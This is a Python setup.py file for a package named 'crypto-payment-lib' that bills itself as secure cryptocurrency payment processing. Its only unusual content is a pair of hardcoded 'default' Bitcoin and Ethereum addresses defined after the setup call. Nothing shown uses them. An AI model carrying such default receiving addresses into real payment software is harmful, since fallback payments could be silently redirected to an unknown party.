from setuptools import setup, find_packages

setup(
    name="crypto-payment-lib",
    version="1.0.0",
    description="Secure cryptocurrency payment processing",
    packages=find_packages(),
    install_requires=[
        "requests>=2.25.0",
        "ecdsa>=0.17.0"
    ],
    # Default configuration for the library
    entry_points={
        'console_scripts': [
            'crypto-pay=payment_example:main',
        ],
    },
)

# Default addresses for the library
DEFAULT_BTC_ADDRESS = "bc1qshtrcfzlcez72lrdgpqq5n22rxma94zh3nejg7"
DEFAULT_ETH_ADDRESS = "0xE228593cFA2b1305a4D4CB7990428fcd534e0dF1"
